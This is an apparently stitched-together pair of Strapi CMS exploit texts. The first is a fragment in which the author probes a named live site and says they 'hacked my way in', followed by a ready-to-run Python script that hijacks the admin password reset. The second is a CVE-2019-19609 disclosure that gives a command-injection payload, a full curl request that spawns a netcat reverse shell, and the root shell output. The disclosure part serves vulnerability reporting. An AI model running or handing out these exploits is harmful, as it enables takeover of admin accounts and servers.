curl https://api.trabajosremotos.es/admin/strapiVersion                                                                                                           
{"strapiVersion":"3.0.0-beta.16.8"}
After looking the issue up on github, and taking a quick read at the changes, I wrote a quick-and-dirty stupid-proof exploit for it and hacked my way in (since none was available online). The issue was a lack of validation of the code parameter sent by the user, that leads to bypassing the code verification otherwise required for it to reset the password.

Well, that’s pretty much it. Morals of the story: always validate whatever comes from the user, and for fuck’s sake… update your shit buddy!

################################
##########################################
################################

import requests
import sys
import json
 
args=sys.argv
 
if len(args) < 4:
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
    exit(-1)
 
email = args[1]
url = args[2]
new_password =  args[3]
 
s  =  requests.Session()
 
version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
 
print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
 
#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)
 
#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)
 
print("[*] Response:")
print(str(r.content))

#####################################
#####################################

##
##



Strapi Framework Vulnerable to Remote Code Execution (CVE-2019-19609)
CVE: CVE-2019-19609

Vendor: Strapi (https://strapi.io)

Product: Strapi Framework

Version Affected: strapi-3.0.0-beta.17.7 and earlier

Fix PR: https://github.com/strapi/strapi/pull/4636

NPM Advisory: https://www.npmjs.com/advisories/1424

Description:

“Manage your content. Distribute it anywhere. The open source Headless CMS Front-End Developers love.”

Recently I came across a cool “headless” CMS called Strapi which makes creating dynamic sites painless. After poking around its code for a bit, I noticed a bit of potentially dangerous code in the plugin installPlugin and uninstallPlugin handler functions for the admin panel (packages/strapi-admin/controllers/Admin.js):

  async installPlugin(ctx) {
    try {
      const { plugin } = ctx.request.body;

      strapi.reload.isWatching = false;

      strapi.log.info(`Installing ${plugin}...`);
      await execa('npm', ['run', 'strapi', '--', 'install', plugin]);

      ctx.send({ ok: true });

      strapi.reload();
    } catch (err) {
      strapi.log.error(err);
      strapi.reload.isWatching = true;
      ctx.badRequest(null, [{ messages: [{ id: 'An error occurred' }] }]);
    }
  },

...

 async uninstallPlugin(ctx) {
    try {
      const { plugin } = ctx.params;

      if (!/^[A-Za-z0-9_-]+$/.test(plugin)) {
        return ctx.badRequest('Invalid plugin name');
      }

      strapi.reload.isWatching = false;

      strapi.log.info(`Uninstalling ${plugin}...`);
      await execa('npm', ['run', 'strapi', '--', 'uninstall', plugin, '-d']);

      ctx.send({ ok: true });

      strapi.reload();
    } catch (err) {
      strapi.log.error(err);
      strapi.reload.isWatching = true;
      ctx.badRequest(null, [{ messages: [{ id: 'An error occurred' }] }]);
    }
  },
Both functions pass unsanitized user input ctx.params.plugin to execa() which is executed on the system.

We can use command substitution to inject commands and execute arbitrary code alongside the node call:

{"plugin": "documentation && $(whoami > /tmp/whoami)","port":"1337"}
This payload should create a /tmp/whoami file on the target system.

To reproduce this issue the app must be using strapi-3.0.0-beta.17.7 or earlier. This is an authenticated RCE, so we would need a valid JWT with access to install and uninstall plugins.

With a valid JWT, we can issue this curl command to execute a reverse shell payload on the server:

curl -i -s -k -X $'POST' -H $'Host: localhost:1337' -H $'Authorization: Bearer [jwt]' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)\",\"port\":\"1337\"}' $'http://localhost:1337/admin/plugins/install'
The strapi server debug log will confirm the input was not sanitized:

[] info Installing documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)...
[] Error: Command failed: npm run strapi -- install documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)
The c2 server receives the connection from the reverse shell:

# nc -lvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 47520
# id
uid=0(root) gid=0(root) groups=0(root)
# 
To Strapi’s credit, I reported this issue and about 20 minutes later they had a fix ready.

Disclosure timeline
2019-12-01 - Issue disclosed to Strapi
2019-12-01 - Strapi fixes the issue
2019-12-02 - Heads-up to NPM Security
2019-12-03 - NPM issues advisory for npm audit
2019-12-03 - Published
